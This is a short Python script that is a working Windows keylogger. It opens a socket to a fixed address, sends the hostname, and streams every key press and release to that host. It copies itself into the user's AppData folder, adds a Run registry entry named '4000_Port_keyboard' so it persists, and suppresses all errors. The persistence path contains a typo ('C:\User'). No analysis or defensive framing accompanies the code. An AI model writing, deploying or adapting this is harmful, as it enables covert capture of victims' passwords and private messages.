def main():
    import socket
    from pynput import keyboard

    HOST = "192.168.1.75"
    PORT = 4000
    FORMAT = "utf-8"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send(socket.gethostname().encode())
        while True:
            def on_press(keys):
                keys = str(keys)
                s.send((keys + " PRESSED ").encode(FORMAT))
            def on_release(keys):
                keys = str(keys)
                s.send((keys + " RELEASED ").encode(FORMAT))
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

if __name__ == "__main__":
    import winreg
    import os
    import shutil
    username = os.getlogin()
    shutil.copy(__file__, f"C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    secret_location = f"C:\\User\\{username}\\AppData\\Roaming\\{os.path.basename(__file__)}"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port_keyboard", 0, winreg.REG_SZ, secret_location)
    try: main()
    except: pass